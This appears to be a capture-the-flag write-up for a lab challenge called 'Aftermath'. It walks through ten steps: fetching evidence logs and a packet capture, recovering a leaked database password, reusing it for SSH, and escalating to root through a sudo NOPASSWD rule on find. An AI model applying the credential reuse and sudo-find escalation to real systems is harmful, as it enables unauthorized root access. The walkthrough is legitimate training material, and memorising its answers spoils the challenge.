# Writeup — Aftermath (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. `curl http://TARGET:8007/evidence/case_manifest.txt` → flag 1.
2. `curl http://TARGET:8007/evidence/auth.log` → an `Accepted password`
   line for `svc-monitor` from `203.0.113.44`, with a `ref=` field → flag 2.
3. `curl http://TARGET:8007/evidence/web_access.log` → the same IP,
   `203.0.113.44`, hits `/admin/export?token=...` seconds after the
   SSH login in `auth.log` → flag 3.
4. / 5. `curl http://TARGET:8007/evidence/capture.pcap -o capture.pcap`,
   then `strings capture.pcap` (or Wireshark → Follow → TCP Stream on
   each of the two conversations) → flag 4 in the first HTTP response,
   flag 5 plus "pivot host: aftermath-host, port 22" in the second.
6. `curl http://TARGET:8007/evidence/memory_snapshot.txt` → a process
   line `mysql -u root -pH@lcyon-Mem0ry! -e "..."` leaks both flag 6
   (a different process's `--token=`) and a password.
7. `curl http://TARGET:8007/evidence/disk_image.img -o disk_image.img`,
   then `strings -a disk_image.img` → a recovered note with flag 7 and
   "the recovery passphrase is ...".
8. `ssh -p 2207 svc-monitor@TARGET`, password `H@lcyon-Mem0ry!` (reused
   from the memory snapshot), then `cat flag8.txt` → flag 8.
9. `sudo -l` shows `(root) NOPASSWD: /usr/bin/find`. GTFOBins' `find`
   entry: `sudo find /root/flag9.txt -exec cat {} \;` → flag 9.
10. Same technique to pull out the encrypted file:
    `sudo find /root/dossier.enc -exec cat {} \; > dossier.enc`, then
    `python3 docker/flagcrypto.py decrypt "<passphrase from step 7>" dossier.enc -`
    → flag 10.

## Honeypots encountered (intentional, cost time only)
- `evidence/old_creds_dump.txt` — explicitly inert decoy credentials,
  unrelated to the real pivot password.
